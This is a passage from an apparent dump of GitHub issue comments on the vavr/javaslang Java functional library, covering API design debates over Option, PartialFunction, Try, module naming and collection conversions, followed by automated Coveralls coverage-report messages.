RuntimeException());\nand\noption.flatMap(value -> f(value).onEmpty(() -> { throw new RuntimeException();}));. Yes, it does, it's just you don't have to do it manually like in your example. But you can use either of the above two examples that I provided and neither involves manual wrapping. You can also use the second example I provided and that involves one less wrap/unwrap cycle.. I agree... It's just too easy to create a function out of a Set with a method reference to the contains method. I think this could be handled while we're still in the pre 1.0 phase. Or in any phase, as it's quite easy to work around it. Similarily for Seq, Map, Multimap.\njava\nSet<Integer> set = HashSet.of(1,2,3);\nFunction1<Integer, Boolean> f = Function1.of(set::contains);\n. What if we would have PartialFunction defined as\njava\npublic interface PartialFunctionNew<T, R> extends Function1<T, Option<R>>{\n    static <T, R> PartialFunctionNew<T, R> of(PartialFunctionNew<T, R> f) {\n        return f;\n    }\n}\nThen, creating a PartialFunction from a Map would be just\njava\nMap<String, Integer> map = HashMap.of(\"a\", 1, \"b\", 2, \"c\", 3);\nPartialFunction<String, Integer> pf = PartialFunctionNew.of(map::get);\nThis version of PartialFunction could be used in the same way as Traversable.collect(), and\njava\ntraversable.collect(oldPartialFunction)\nwould become\njava\ntraversable.flatMap(newPartialFunction);\nI know, this would break the alignment with Scala. It would also incur one extra allocation of Option<R>, in case partial function is defined at that value, otherwise it will return the singleton none().\nBut calling isDefinedAt and possibly apply in PartialFunction's current form has it's own cost: a double lookup in case of a Map for example. So we could argue which one is more efficient of the two. My off-the-cuff prediction would be that the allocation of Option would be the cheaper one as JVM is quite good at optimization, and escape analysis would make it possible to allocate these Option instances on the stack whenever it can make sure it doesn't escape the local context - but I admit, I haven't made any measurements on this.. I've made some quick measurement testing with the current PartialFunction and the functional interface one that would return Option. You can see the JMH benchmark and the results at https://gist.github.com/nfekete/d671372ec8fb631308a495296b47326e\nThere are two runs, one with 100% hit ratio, the other with 50% hit ratio (all keys have entries in the map, half of the keys have entries in the map, by random).\nInterestingly, the functional interface version that returns Option is both faster and lighter on the GC. It has around half the memory allocations (avg 64 bytes vs 32 bytes when run with 100% hit ratio) compared to the current version.\n. @garlicsauce I think this is a limitation of the type inference engine in javac. Eclipse compiles the code just fine. In similar cases like this, when the code itself is valid, but it fails to compile because of some type inference limitation, it's usually solved by a simple addition of a type witness to help out the compiler:\njava\nreturn Match(event).<Change> of(\n    Case($(instanceOf(ChangeDeployedOnDevEnvEvent.class)), this::apply),\n    Case($(instanceOf(ChangeAccepted.class)), evt -> this.apply(BO_ACCEPTED, evt)),\n    Case($(instanceOf(AcceptanceIgnored.class)), evt -> this.apply(NEW, evt)),\n    Case($(instanceOf(ChangeSignedOffOnQA.class)), evt -> this.apply(SIGNED_OFF_ON_QA, evt)),\n    Case($(instanceOf(ChangeDeployedOnQA.class)), evt -> this.apply(DEPLOYED_ON_QA, evt)),\n    Case($(instanceOf(ChangeAcceptedByQA.class)), evt -> this.apply(ACCEPTED_BY_QA, evt)),\n    Case($(instanceOf(ChangeDeploymentOnQAFailed.class)), evt -> this.apply(SIGNED_OFF_ON_QA, evt)),\n    Case($(), o -> {\n        throw new IllegalArgumentException(\"Unsupported event\");\n    })\n);\nWith the added type witness, this code compiles with javac as well.. to(Class<C> type) seems a bit ugly to me as it involves reflection to create an instance of that class. Isn't Value.collect() enough for this?. @chantrybjss as a workaround you could use this pattern:\njava\noption.map(nullReturningFunction).flatMap(Option::of)\nThe flatMap(Option::of) would make sure you switch over from Some(null) to None.\n. @kennymacleod this was already discussed in https://github.com/vavr-io/vavr/issues/2117. Bite the bullet, go for simulated higher kinded types and unite *.transform(...) with Iterable.to(...)? Because they are basically the same, except for the lack of HTKs, right?. I'm not for the enumerating all the conversion methods at all. I think a single transform(...) would be enough, if we could only express it in Java without simulated HKTs and other workarounds. @jbgi's work on derive4j/hkt seems very interesting. There is also KindedJ which seems to be adopted by Arrow for Kotlin and AOL's Cyclops\nBut I also recognize your aim to simplify things as much as possible and to stay away of external dependencies.. But they are not the same.\nVector:\n<U> U transform(Function<? super Vector<T>, ? extends U> f)\nMap:\n<U> U transform(Function<? super Map<K, V>, ? extends U> f)\nIterable:\n<C> C to(Function<Iterable<T>, C> fromIterable)\nThere is value is the specificity of the transform method as opposed to the genericity of the to method. Transform takes a function that takes as input the concrete type on which transform is defined. Hence, you can efficiently transform a Vector by directly indexing one of the values in it, or directly taking out a value from a Map. You can't do that with the current version of to because it's too generic, it's takes a function that takes an Iterable of values. You can't take advantage of the concrete type when doing the transformation.\nThe two methods could be united, but only if you could somehow declare at the top level (at Iterable) that you're gonna take a function that takes as input the current self type. But you cannot express this without HKT's I think.\n<U> U transform(Function<? super *SELF*, ? extends U> f)\nBecause we can't express the above, I think it's better to keep both. transform methods on the concrete implementation level, to on Iterable.\n. Yes, I can mark individual tests to suppress deprecation warnings as well. And I could migrate most of the tests to the new method too, so that the new one is also hit by the test coverage, maybe leave one test on the deprecated one so that it stays covered by tests. What do you think?. Thank you too!. Hey Daniel!\nI'm not very familiar with JPMS. Anything that I say might not make sense at all. \nIt would be nice if vavr would be usable from both the classpath and the module path. Keeping Java 8 compatibility for the foreseeable future would be very important, almost 80% of devs are on Java 8. See the latest survey about the JVM ecosystem here: https://snyk.io/blog/jvm-ecosystem-report-2018\nIf JPMS module name collision requires us to use io.vavr.core for the main package, I think that's perfectly fine. It's just a name after all. The important thing is that it represents what it provides and that seems to be met.\nAs for what the individual modules should contain, where the module boundaries should be drawn, I think we should select a few fundamental things that should go into the core module, the non-fundamental things can go into their own modules. The fundamental things from my point of view are:\n - vavr (rich) Iterable() + Iterator\n - control structures: Option, Either, Try\n - function types\n - tuples\n - contract interfaces? (*)\n) We don't presently have this class, and I think, where it makes sense, we should make vavr classes implement a vavr Iterable. That is, a type that provides a \"better\" Iterator, a vavr Iterator. Value was problematic because it was in a way a kitchen sink that contained many functions that didn't really made sense for all subtypes. vavr Iterable as a supertype would be different in the sense that whenever you have a container that wraps 0 or more values, you could view it as something that you can iterate over. And io.vavr.Iterable<T> would contain only the io.vavr.core.Iterator<T> iterator() method, so that wouldn't be a kitchen sink as Value was.\n*) By contract interface I mean interfaces that define a contract in a similar way as java.util.stream.Collector defines a contract to collect values. I'm not sure we would need such interfaces, but if we did, it would probably make sense to go into the core module.. Tuple[2..3], Function[0..2] mostly. But I guess if we have Tuple[1..3] and Function[0..2]we should probably have them up to some reasonable number.\nRegarding types being iterable, I think it's important to have io.vavr.core(collection.)?.Iterable at the top of the hierarchy, so that we can get a rich vavr Iterator out of these types without casting. For me, most naturally it would belong to the io.vavr.core package, it's not necessarily related to collections, collections just happen to all be iterables. Also, java Iterable is in the java.lang package.. I was mainly thinking about an iterable declared in a similar way:\njava\npackage io.vavr.core;\npublic interface Iterable<T> extends java.lang.Iterable<T> {\n    @Override\n    io.vavr.core.Iterator<T> iterator();\n}\nI'm wondering about the usefulness of the map/flatMap methods. Do you have a use-case?\nI think they would just cause problems further down in the type hierarchy.. That, at the first iteration, would lazily create an immutable linked list wrapping Character objects, as Stream is essentially a lazily created linked list. What you're looking for is rather something like an Iterable<Character>. Indeed, there is something similar in vavr: CharSeq.of(String). Chat is ephemeral, so if you think your question might benefit others too, consider posting it on stackoverflow.. Thank you very much, Daniel!. compile is the default scope in maven if no scope is specified. <scope>compile</scope> thus should be redundant. See maven docs.. Would it make sense to reflect the java module names in the maven module names as well? It might help avoid confusion. I.e.:\nMaven module | Automatic module name (1.0.0 / next)\n-- | --\nvavr-core | io.vavr.core\nvavr-match-annotation | io.vavr.match.annotation\nvavr-match-processor | io.vavr.match.processor\nvavr-test | io.vavr.test\n. Scala has a data structure with similar behavioral but weaker runtime guarantees: ListMap. I think that vavr's LinkedHashMap is superior and worth keeping.. @danieldietrich #2137 doesn't apply anymore?. Oh, I see, my mistake. I thought this was already in the 0.9.x line. \ud83e\udd26\u200d\u2642\ufe0f . @danieldietrich the conclusion of #2137 no longer applies? I believe declaring throws Exception is better than throws Throwable. Could you explain the rationale behind this change?. After thinking again about it I tend to agree with this decision. Thanks for elaborating, @danieldietrich.. Wait, I might be missing something here. So there is going to be CheckedFunction[0-8] in io.vavr that declare to throw Exception and Checked(Consumer|Function|Predicate|Runnable|Supplier) in io.vavr.control declare to throw Throwable?. @tlinkowski some errors are considered fatal, they will be rethrown. See the implementation at https://github.com/vavr-io/vavr/blob/9fbb68d140ca3e119524626656786010d0b5da83/src/main/java/io/vavr/control/Try.java#L756-L761\nThe two exceptions you mentioned are both subtypes of LinkageError so they'll be both rethrown, among some other error types. See the type hierarchy of the types in the instanceof expression.. @tlinkowski The check being in the constructor will never allow Failure to be constructed with those error types, and perhaps that was the original intent.. Wouldn't that give up lazyness of the Seq<V> returned?. Oh, I see it now. Lazyness is causing problems when querying size of the lazy Seq, right?. So we're trading creation performance and low memory footprint for read performance here. I realize every decision is a tradeoff, but this one isn't cheap at all. Somehow I feel both could be preserved with a lazy Seq type that knows it's size.. Java spliterators have some means to query the exact number of elements if the spliterator has the SIZED characteristics. Spliterator.estimateSize() will report the exact count of elements if the underlying collection is not modified after spliterator creation.. I'm just thinking out loud here, but it seemed that we're getting rid of the nice lazy and memory efficient Stream based values() implementation by replacing it with one that duplicates the whole map because our size() implementation is expensive. Seq (or rather, Traversable) doesn't give any guarrantee on the runtime of it's size() implementation, and actually it's javadoc states that the number of elements is computed. In the same way, there's no guarrantee over the get(i) performance.\nFrom #2020 we know that the size() implementation inefficiency causes problems when converting to Java Collections.\nThese are actually just projections of already existing immutable collections. For the map values or keys we could have a projection of the map that is both efficient in determining it's size and iterating over the elements. It might be solved with a special purpose non-public implementation of Seq.\nI see another way around this, though I think the previous one would be clearer. Seq could be augmented like this: if we would know the size of the Seq (in case it has a definite size: isSizeDefinite()), we could answer size() with O(1). Of course, we cannot be sure all Seqs will have definite size (i.e. infinite streams or on-the fly generated ones), but for these simple derived Seqs we could have both efficient lazy Seq and quick size(). This second solution could be useful in other cases as well, but it feels to me like an early optimization (root of all evil :)) and complicates the interface.\n. I like this solution, since it won't sacrifice the low cost properties of those derived Seqs, while making conversion to java collections efficient.. What is lombok used for?. Lombok would be especially problematic, since it's manipulating bytecode, it's doing totally non-standard things, it's not just a regular annotation processor, hence it's incompatible with GWT, which Vavr supports.\nEDIT: it's actually manipulating internal compiler AST representations instead of bytecode, and it might actually work with GWT, since GWT also uses ECJ, but it's still problematic, see my comment below.. Lombok will hook into the internal compiler code of javac and ECJ and modify their internal in-memory AST representation to convince the compiler to generate bytecode according to the annotations you use. With the way it works, you will get into trouble as soon as you'll try to use the same code in another compilation environment, which requires consistency at the source level, since Lombok generated (byte-)code is invisible to those tools. While that may or may not work with GWT, since GWT also uses ECJ, it will definitely break with any other transpiler or tool that parses java source code. It's a total hack that can break any time too, should the javac or ECJ team decide to change some internal implementation details of their compilers. Because of these, for me it's totally out of question to use it in any serious project. . Maven lifecycle refernce \u27a1\ufe0f verify is just before install\n. Or if you're using Eclipse somehow, and it compiles, it's probably safe to remove.. Looks good to me, but I admit I don't really know the advantage of this version over static <T> Iterator<T> iterate(Supplier<Option<? extends T> supplier). Would you help me out with this?. Since Stream, in contrast with Iterator, can be iterated multiple times, I think it's worth mentioning in the javadoc that the Stream will constructed in such a way that the Supplier will be invoked only that many times until it returns None, and repeated iteration over the stream will produce the same values in the same order, without any further invocations to the Supplier.. That would slightly change the current behavior, that the elements in the  List are kept in the order they were first inserted to the List, and thus to the LinkedHashMap and LinkedHashSet it is backing. Whether that is acceptable or even desirable, that I don't know \u26c4\ufe0f . Because that <E> type argument is documented at the class level since it's the generic type argument for the class itself, the java.util.List.add(E e) doesn't introduce a new type argument in the equation. See Tuple2.map1 for an example on what is needed to be documented here.. ",
    "alshain": "Also, IntStream is specialized for ints, vavr will be using Integer which probably also makes a huge difference.. For future reference, this is probably the cause of the following error:\n\nError:java: Bad service configuration file, or exception thrown while constructing Processor object: javax.annotation.processing.Processor: Provider io.vavr.match.PatternsProcessor not found. I'm aware that I can use ::apply.  Having to use ::apply just because of a Java limitation makes the code more inconsistent.  I can see that for lambdas the andThen syntax is problematic, I didn't use that in my case.\n\nWhy not add a different method instead such that I'm not forced to use ::apply just because of Java? I'm not opposed to using String::toString method references or whatever, but apply just makes it clear that functions still close to being second class citizens.. Hi Daniel, thanks a lot for the reply.\nIt's not like users wouldn't be able to use lambdas in the future. As for my use case: I use vavr in conjunction with a project on older Tomcats where I can't use lambdas inside JSPs.\nPersonally, I would like to see deferred. It allows me to transform functions more easily by applying operations on them, much in the vein of .compose, .andThen etc, it seems to be more consistent rather than having to make a lambda being the only way to do this. Also, this leads to better discoverablility and autocompletion.\nOn another note, curry() on Function1() being the identity seems a bit strange. Is that intentional or an artifact of the code generation?. ",
    "ouertani": "French article java 8 and trampoline http://www.infoq.com/fr/articles/trampoline-java8\n. ",
    "ggalmazor": "Maybe we could also benefit from something like Try.peek() (as in Stream.peek()) to support side effects on a map/filter pipeline. This would be helpful with objects like the one from your example whose methods don't return themselves (impeding their use on map() phases in the pipeline).\n. I was thinking mainly on legacy apis... \nLet me try with an example (it's not the best... I'll find another). This code is what I'm actually using for hashing strings with SHA256:\njava\nString hash = Try.of(() -> MessageDigest.getInstance(DIGEST_ALGORITHM))\n    .map(sha256 -> {\n      byte[] bytes = Try.of(() -> input.getBytes(ENCODING)).get();\n      sha256.update(bytes);\n      return sha256;\n    })\n    .map(MessageDigest::digest)\n    .map(digest -> {\n      StringBuilder sb = new StringBuilder();\n      for (byte aDigest : digest)\n        sb.append(String.format(\"%02x\", aDigest));\n      return sb.toString();\n    })\n    .get();\nWith peek(), I could avoid artificially returning the sha256 instance in the first map():\njava\nString hash = Try.of(() -> MessageDigest.getInstance(DIGEST_ALGORITHM))\n    .peek(sha256 -> {\n      byte[] bytes = Try.of(() -> input.getBytes(ENCODING)).get();\n      sha256.update(bytes);\n    })\n    .map(MessageDigest::digest)\n    .map(digest -> {\n      StringBuilder sb = new StringBuilder();\n      for (byte aDigest : digest)\n        sb.append(String.format(\"%02x\", aDigest));\n      return sb.toString();\n    })\n    .get();\nThe problem here is that I'm dealing with a legacy, mutable object, and that I'm forced to 'lie' to the Try's api, because I'm not really mapping anything.\nI know that I have another better example... but I can't recall :)\nAnyway, I recon that it's indeed a very small improvement with an easy workaround...\n. yay!\n. You could throw in Code Style, File templates and maybe toString templates (as you've defined it in the contribution guide).\nTake into account that those settings are imported in a separate profile so it doesn't collide with previous settings that we could have :)\n. Inspection Profiles! I forgot.\n. Great!\n. Specific example... \n``` java\nstatic class Example {\n    static Option extract(String str) {\n      if (str.length() >= 15) str)\n        return Option.of(str.substring(10, 15);\n      return Option.none();\n    }\n  }\nStream> sums = Stream.of(\"cocotero\", \"chuchu blabla pinpon\")\n        .map(Example::extract)\n        .flatMap(String::chars)\n        .flatMap(IntStream::sum);\n```\nIf you collected the stream, you'd get one None() and one Some().\nBut i'm thinking that it might be impossible to check or infer the types right...\n. Wow, this is awesome :)\n. Therefore:\n``` java\n    @SuppressWarnings(\"unchecked\")\n    @Test\n    public void shouldSlide5ElementsBySize2AndStep4() {\n        assertThat(of(1, 2, 3, 4, 5).newSliding(2, 4)).isEqualTo(of(of(1, 2)));\n    }\n@SuppressWarnings(\"unchecked\")\n@Test\npublic void shouldSlide4ElementsBySize5AndStep3() {\n    assertThat(of(1, 2, 3, 4).newSliding(5, 3)).isEqualTo(nil());\n}\n\n```\n. For what it's worth, I've been using this implementation for Java8 Streams for some time now.\n. :+1:\n. Sounds good! Thanks a lot :) Will adapt my current code to 1.2.2 and let you know how it goes :)\n. :+1: \n. Of course! It's completely reasonable what you're arguing :) Don't worry about it. I don't like @unsafes too ;)\n. I see that this fix is not available yet in 2.0.0-beta version... Is this right?\n. Sorry! My local maven cache was giving me a hard time and I was seeing 1.2.2 as 2.0.0...\n. You have to take into account that Gitflow is designed for a scenario with only one repository. The flow for contributions in Github uses to be a Forking flow, in which contributors have their repo and can request pull requests.\nHere's a nice summary of different git flows: https://www.atlassian.com/git/tutorials/comparing-workflows/gitflow-workflow\n. Well, we can discuss this after 2.0.0 release :)\n\u2014\nGuille\nOn Sun, Nov 8, 2015 at 12:07 PM, Daniel Dietrich notifications@github.com\nwrote:\n\nThanks, that helps. I'm not used to it, at $work we still use a self-hosted svn...\nReply to this email directly or view it on GitHub:\nhttps://github.com/javaslang/javaslang/issues/463#issuecomment-154806197\n. :+1: \n. Oh, I was searching on TupleN classes. Didn't occur to me looking in Tuple. Closing Issue...\n\nThanks!\n. When I am working with Tuples I often want to handle their contents the same way I would with a List: map a Tuple3 into a Tuple2, fold all objects into one...\nI see Tuples as a sequence of objects that are heterogeneously typed. According to the current type hierarchy, imo they should extend Value.\nI guess that they couldn't extend Traversable because a Tuple doesn't store objects with the same type, but in an imaginary Java where this is possible, I'd see Tuple at the same level as Seq.\n. Anyway, I think that the name of the factory method is misleading. IMHO factory methods should be:\n- When providing an individual object: List.of(T element)\n- When providing a collection or array of objects: List.ofAll(T[] elements) and List.ofAll(Iterable<T> elements)\nThis way, there would be no possible confussion:\n- List.of(T) gives List<T>\n- List.of(T, T, T,...) is not supported\n- List.of(T[]) gives List<T[]>\n- List.of(Iterable<T>) gives List<Iterable<T>>\n- List.ofAll(T) gives List<T> supported by next varargs signature\n- List.ofAll(T, T, T, ...) gives List<T>\n- List.ofAll(T[]) gives List<T> supported by varargs signature\n- List.ofAll(Iterable<T>) gives List<T>\nI'd indulge the redundancy of List.of(T) == List.ofAll(T) in favor or a more coherent API.\n. Alright! :)\nYeah, I didn't specify the cases for primitive arrays as they should behave (imo) just like in List.ofAll(T[])\n. :+1: \nThis looks nice!\n. Do we have a test class with all the cases? I have to confess that I'm a little confused right now...\nI can work on a test this weekend...\n. So, I've updated my fork and I've taken a look to the tests... some thoughts:\nCurrently, it's really difficult to get a grasp about what we can do with Javaslang... There is too much setup code. Take, for example ListTest: there are 160 lines for test preparation for 50 lines of (hard to read) test code...\nAlso, extending test cases doesn't help to make things easier (otherwise, we wouldn't have those 160 lines, would we?). We should use @RunWith(Parameterized.class) to run same tests on different objects.\nWe could write test classes centered on specific scenarios: empty lists, exception handling, etc.\nTest could be the number 1 go-to reference when trying to understand any of Javaslang's features if we wrote them slightly different.\nI've started working on this concept and I've commited into my fork a pair of test reflecting this and I'd like to discuss this before requesting a pull request.\nThe goal would be to adapt AbstractSeqTest and all its implementations to these concepts, using @RunWith(Parameterized.class) which would produce more readable and concise tests.\nI can start working on that if I've convinced you :)\n. Ok! Agree on everything you said :)\n\nCurrently we use abstract methods and assertion override to define the behavior of a specific test impl. How would this look like with a @RunWith(Parameterized.class). Could you sketch this, please?\n\nThat was step 2 of my plan. I'll work on a sketch and get back to you before start working on everything...\n. While working on the tests I've noticed that we can Tree.ofAll(List.of(1, 2, 3)) but there is no Tree.of(1, 2, 3)... is this right?\n. We don't really have more than one level depth monadic structures... therefore we don't need a cascading .flatten().\nIn our case, 100% of the times that we want to flatten a structure, we want to retain types by applying .flatMap(Function.identity()) because it's always a one level depth structure.\nIt would be great to replace the current (v2) implementation of .flatten() for an alias to .flatMap(Function.identity())as it would produce a more compact and easy to read code (as in v1).\n. Great to hear that, thx!\n. (Just writing this to reason about your quesion... My answer in next comment)\nIf we're talking about one-level depth, same monad .flatten(): yes, we are writing something like this in prod:\n// = List(1, 2, 3, 4, 5, 6)\nList<Integer> flat = List.ofAll(List.ofAll(1, 2, 3), List.ofAll(4, 5, 6)).flatten()\n(with a List<List<T>>)\nWe aren't using .flatten() with structures like the one in your last example:\n// = List(1, 2)\nList<Integer> ints = List.ofAll(new Some<>(1), new Some<>(2), None.instance()).flatten()\n(with a List<Option<T>>)\nIn this particular case, we are currenlty using filter & map:\nList<Integer> ints = List.ofAll(new Some<>(1), new Some<>(2), None.instance())\n                         .filter(Option::isDefined)\n                         .map(Option::get)\nNow I'm realizing that we could use .flatten() for the two cases. The tradeoff is a possible runtime exception if we're not careful, but we already are risking that if we switch to .flatMap(Function.identity().\n. My answer is YES, we would use .flatten()a lot. The tradeoff is worth the value we are getting.\nI'd focus now on producing the most clear error message with the best stacktrace we're able to for when it goes south.\n. :+1: \n. You're absolutely right! I didn't think of that option...\n. I declare myself unable (yet) to fully understand that twitter conversation :P (It's clear that I have a long path ahead of me yet to be walked)...\nI understand your position in this matter... I'll handle my unchecked's in my code :D\n. Hi all!\nI'm migrating a large codebase from Javaslang 1.2 to version 2.1.x and we use extensively o.orElse(null) that would have to be migrated to o.getOrElse(null). \nLet me explain beforehand that we only do this in our domain boundaries when interacting with third party libraries that require nulls to work properly.\nThe problem is that the compiler can't decide which implementation of getOrElse() to use because there are two of them (one with a T other and another one with Supplier<? extends T> supplier). The solution at this moment is to do a weird cast of null: o.getOrElse((T) null).\nA method o.getOrNull()  would be very helpful to produce a less verbose code. As discussed on this thread, I wouldn't use scala's orNull syntax to be more coherent with Javaslang's current API.. I prefer Option's API because is more complete and coherent with Javaslang's other artifacts (in my apps I only use Option).\n. Also, Optional is not serializable which makes it impossible to use with Apache Spark, for example.\nI'd have to use Scala's Option and then translate it back and forth into Optional :( \n(or Guava's... even worse)\n. Well, I can only guess that they're ok with nulls inside collections in a distributed computation... That's a luxury I can't afford :P\n. @talios thanks for the explanation :)\n. Hi Daniel! I understand and next time I'll check Scala for reference :) I'm closing the PR.\nAnyway, my problem is not with isEmpty(). My pull request modified it only because it's used by toOption().\nMy problem is that I have a computation that runs inside a Try which can return a null. I can't get rid of that because I'm integrating with a third party here. I want to wrap the result in an Option for further use of the result but then I may have a Some(null) which can produce runtime bugs in my app. \nI know that Scala's Try(null).toOption can give a Some(null), but this is kind of wrong, isn't it? The fix is an easy one: we could make Value.toOption() to go through Option.of() factory method when it's not empty to solve the problem:\ndefault Option<T> toOption() {\n        if (this instanceof Option) {\n            return (Option<T>) this;\n        } else {\n            return isEmpty() ? Option.none() : Option.of(get());\n        }\n    }\nResearching for this reply I found this thread in StackOverflow that explains why Some(null) is an acceptable value in Scala TLDR: It's just to achieve interoperability with Java (calls to methods that return null, accessors in Lists, Maps, etc.).\nIf this is true, we can decide to produce a None instead a Some(null) in Value.toOption() if the value is not empty. \nI mean... I never ever want a Some(null) in my code. \nIf we don't fix this, I can't trust that the value of a Some is not null and we're back to the if (something == null) and that's a situation that I'd like to avoid (again).\n. Even better: We could:\nstatic <T> Option<T> some(T value) {\n        return of(value);\n    }\nThis would prevent a Some(null) from any source.\n(Also, remove some(T value) factory)\n. Ok... That's what I'm doing right now.\nI'd want to understand why you'd need a Some(null). Not trying to be rude... really :) Could you provide an example?\n. (I haven't read the last links yet, sorry about that)\nI've prepared a test representing transformations between Option, Try and Either to reflect on what you've explained.\nThe test covers all possible transformations between these types and possible contained values according to the current implementation:\n\nSo, arrows and arrow points work as usual. Notice that None to Either gets inverted (in red) for obvious reasons.\nSome things from the top of my head that I don't understand quite yet:\n- Sorry to throw your own quotation back at you but (I need to understand this):\n\nI think it we cannot assume that null stands for 'absent' or 'undefined' in every (use-)case because Java lets room for interpretation of that value.\n\nIsn't the same problem to asume that None => Failure? (There is no line between None and Success) Why is this different?\n- Left.toOption() doesn't do the same as Left.left().toOption() which is weird. Is this a bug?\n- Try.run().toOption() gives a Some(null) which makes everything more strange\n. Thanks a lot @danieldietrich. I've learned a lot these three days. You have a lot of patience :)\nThanks for the example too, @talios. In our apps we force modeling nullable properties into Options, with the convention that a null is always mapped to a None. It makes sense because when a query returns a null value, then that column is an optional value that is not present. Also it provides nice semantics when reasoning about our domain model and a nice API when working with those objects.\nWe don't have queries which have rows filled completely with nulls because that wouldn't make any sense in our app.\nWe do have some queries that aggregate values from different sources which can produce some groups of columns with null values (doing left joins that you mention) but then again, we model that as an optional property in an aggregate domain. \nWe try to forbid null values in our apps. We have clearly defined domain boundaries where data is produced (web port for user input, database port, filesystem port, messaging port for queues, etc.) and that let's us to have a central code realm that follows our own rules. One of those rules is to not ever have a null and have Nones instead.\nThanks to this, we can protect ourselves from my original problem of Try.of(()->null).toOptional() being a Some(null) and transform it into a None in one of those boundaries where that happens.\nI guess that the bottom line for me is: does it make sense to forbid null values in your business logic? (assuming that I can control all data flow into it) \nWe've been making this (among other things, naturally) for almost 2 years now, in a big codebase involving domains of operational applications, management tools, data analytics and big data. It feels right and produces clean, understandable, less buggy code. \nI'd be very happy to hear about any \"horror story\" from you :)\n. Just pitching in some (maybe not useful) theory here:\nIs AbstractMap a key piece in Map's type hierarchy? If not, maybe this is one of those cases where we try to apply inheritance wrongly while pursuing code reuse.\nCode in AbstractMap can be reused without inheritance. Package local static methods will work and what has to be weighed here is the trade off of having some calls duplicated in classes that should use AbstractMap's methods.\n. Glad to hear that from you. I deal with this kind of problems in my daily work a lot and sometimes it's hard to explain this to people. \ud83d\udc4d \n. I understand that in Java you can't define a type for the mapper that complies with T, U and V at the same time. With Javaslang's Tuple's map() fn you can do this:\n```java\n  class Result {\n    private final T t;\n    private final U u;\n    private final V v;\nResult(Tuple3<T, U, V> t) {\n  this.t = t._1;\n  this.u = t._2;\n  this.v = t._3;\n}\n\n}\npublic Result getResult() {\n    return new Result<>(Tuple.of(\n        Future.of(() -> \"cocotero\"),\n        Future.of(() -> 1),\n        Future.of(() -> true)\n    ).map(Future::get, Future::get, Future::get));\n  }\n```\nIt's more verbose, but this lets Java bind the types for each mapper according to the Tuple's types.\nI'm sure that @danieldietrich will be able to throw more light into this... It's always interesting to think about this kind of problems: container types (Future) inside container types (Tuple).. @danieldietrich @pasku @santiagopoli following what's been said here... In JavaScript I'd use a barrier to wait for all 3 promises to be resolved and then build my Result instance:\n```javascript\nclass Result {\n  // blablabla\n  static of([value1, value2, value3]) { // ES6 array decomposition\n    return new Result(value1, value2, value3);\n  }\n}\nq.all([promise1, promise2, promise3])\n  .then(Result.of)\n```\nFollowing this idea:\n1 - Is there any kind of barrier mechanism available for Futures in Javaslang?\n 2 - Could we leverage Javaslang's Pattern Matching to solve this problem (destructuring the array of results of each Future)? Does this make any sense?\nedit: Depending on the promises library that you use, you could even do this:\njavascript\nq.all([promise1, promise2, promise3])\n  .spread((value1, value2, value3) => new Result(value1, value2, value3))\nHere there is no need for array destructuring because .spread() operator takes care of it for you. I understand that this is almost the same that will happen with the new For comprehension in Javaslang 2.1.0. ",
    "coveralls": "\nCoverage remained the same at 100.0% when pulling 07715fb1ae3bdd7a5da1b70c74d9d100dc5e3b87 on danieldietrich:master into e21195cc9f102f8dd9734f7232011388071befda on javaslang:master.\n. \nCoverage remained the same at 100.0% when pulling bf4dcdf576b00a2c579c6505a9ad762e8596e967 on danieldietrich:master into f6dfb5e01faada2fb769c13af17df4f129180fbd on javaslang:master.\n. \nCoverage remained the same at 100.0% when pulling 080e3db867500f7d6c01378bc753bbc06ae574f7 on danieldietrich:master into 174f99ad389464be6c9999d3fec79798e38e68f9 on javaslang:master.\n. \nCoverage remained the same at 100.0% when pulling 42f9835cf7a49cb801c4aa037755c293c4a10a1f on danieldietrich:master into af281d05f1fb4c29144d186f96aefe8246ceea80 on javaslang:master.\n. \nCoverage remained the same at 100.0% when pulling 1ad21b579cbdd6040e3110270e521d11a6b6985c on danieldietrich:master into 9fffcfef9cfafdb202507e4c86728cff63c941a4 on javaslang:master.\n. \nCoverage remained the same at 100.0% when pulling aa2483ff66d3300dfaf9f3ea8f66920b0b0aff05 on danieldietrich:master into 98dd670986c0302abdec2a08a4d6a0e5bd03a66a on javaslang:master.\n. \nCoverage remained the same at 100.0% when pulling 9a2ff87c181a3da1d99ee6ed41ac9110148bd167 on danieldietrich:master into ca9e1bb636e1af2c886b78ed7c4bf0b76eb6ed1c on javaslang:master.\n. \nCoverage remained the same at 100.0% when pulling eb0a11a24300a8f420b0e09b13e1feb4581d4750 on danieldietrich:master into 5e881ac2b42af6d3a993cef7d4278269002b4f92 on javaslang:master.\n. \nChanges Unknown when pulling bdc383e6292de6146c60f553e2217e6b96742e39 on danieldietrich:master into * on javaslang:master*.\n. \nCoverage remained the same at 100.0% when pulling 62305d3f2be036b7460ef9b023944a779d292d9d on danieldietrich:issue188 into 8fa75e000aeb9ed379ec5cde43362d9ec5429472 on javaslang:master.\n. \nCoverage decreased (-0.0%) to 99.89% when pulling 4bc98ff7ca8cdf8433dd350b6619e709ec5e5645 on danieldietrich:master into 1a4f1866eb093830deb3480c05be18af0d8635fc on javaslang:master.\n. \nCoverage increased (+0.03%) to 99.92% when pulling a0fc158d5f013259acdce3c91b479439cdefde1a on danieldietrich:master into 1a4f1866eb093830deb3480c05be18af0d8635fc on javaslang:master.\n. \nCoverage increased (+0.03%) to 99.92% when pulling 008b6efb23f259be1cfcb768118988310f201cef on danieldietrich:master into 1a4f1866eb093830deb3480c05be18af0d8635fc on javaslang:master.\n. \nCoverage remained the same at 99.92% when pulling 363f6446efb8ad2f3258ae012e376117622f6613 on danieldietrich:issue225 into 4771beb4f34f45a2d7c56f456c7c178a1f9cda05 on javaslang:master.\n. \nCoverage increased (+0.0%) to 99.92% when pulling d884733d7c78a535da7b0f09223f6a382f7ed9be on danieldietrich:issue225 into 4771beb4f34f45a2d7c56f456c7c178a1f9cda05 on javaslang:master.\n. \nCoverage remained the same at 99.92% when pulling be2a40c35d472401f2f9f7cf64161005a15990f7 on ftomassetti:refer-to-CONTRIBUTING-in-README into 00e8f0d41cfa13f3775b37155a71949b707ec2a4 on javaslang:master.\n. \nCoverage remained the same at 99.92% when pulling be2a40c35d472401f2f9f7cf64161005a15990f7 on ftomassetti:refer-to-CONTRIBUTING-in-README into 00e8f0d41cfa13f3775b37155a71949b707ec2a4 on javaslang:master.\n. \nCoverage decreased (-0.04%) to 99.76% when pulling 3a58c54cd833840e72d32c070286f023d03f1051 on Sounie:master into 65aff17b9199df09f683fe6bbc4fa6667b93b4ec on javaslang:master.\n. \nCoverage remained the same at 99.82% when pulling 9edd6c7e0f9604a86d54b5935e3abd3e54a0fb75 on 